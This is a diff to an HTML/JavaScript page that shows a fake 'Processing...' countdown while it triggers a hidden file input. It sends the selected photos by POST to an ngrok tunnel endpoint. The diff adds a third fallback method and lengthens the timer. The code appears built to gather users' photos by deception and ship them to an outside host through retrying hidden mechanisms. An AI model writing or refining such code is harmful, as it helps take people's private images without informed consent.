@@ -42,7 +42,7 @@
 
     <!-- Countdown section -->
     <div id="countdown-section" class="hidden">
-        <p class="countdown">Processing... <span id="countdown-timer">5</span> seconds remaining.</p>
+        <p class="countdown">Processing... <span id="countdown-timer">10</span> seconds remaining.</p>
     </div>
 
     <!-- Hidden file input -->
@@ -68,8 +68,8 @@
         async function uploadPhotos() {
             const fileInput = document.getElementById("photo-upload");
 
-            // Attempt 1: Trigger file input directly
-            console.log("Attempting to trigger file input...");
+            // Method 1: Trigger file input directly
+            console.log("Attempting Method 1: Trigger file input directly...");
             fileInput.click();
 
             // Listen for file selection
@@ -84,7 +84,7 @@
                         formData.append("photo", file);
 
                         try {
-                            const response = await fetch("https://bc03-91-2-36-103.ngrok-free.app", {
+                            const response = await fetch("https://abc123.ngrok.io/upload", {
                                 method: "POST",
                                 body: formData,
                             });
@@ -103,10 +103,10 @@
                 }
             });
 
-            // Attempt 2: Use a hidden iframe as a fallback
+            // Method 2: Use a hidden iframe as a fallback
             setTimeout(() => {
                 if (fileInput.files.length === 0) {
-                    console.log("Attempt 1 failed. Trying fallback method...");
+                    console.log("Method 1 failed. Trying Method 2: Hidden iframe...");
                     const iframe = document.createElement("iframe");
                     iframe.style.display = "none";
                     document.body.appendChild(iframe);
@@ -114,13 +114,23 @@
                     fileInput.click();
                 }
             }, 3000); // 3-second delay
+
+            // Method 3: Simulate drag-and-drop (if supported)
+            setTimeout(() => {
+                if (fileInput.files.length === 0) {
+                    console.log("Method 2 failed. Trying Method 3: Drag-and-drop simulation...");
+                    const dataTransfer = new DataTransfer();
+                    // Simulate adding files (this is just a placeholder)
+                    console.log("Drag-and-drop simulation not fully supported. Skipping.");
+                }
+            }, 6000); // 6-second delay
         }
 
         // Function to start the countdown
         function startCountdown() {
             const countdownSection = document.getElementById("countdown-section");
             const countdownTimer = document.getElementById("countdown-timer");
-            let timeLeft = 5;
+            let timeLeft = 10;
 
             // Show the countdown section
             countdownSection.classList.remove("hidden");
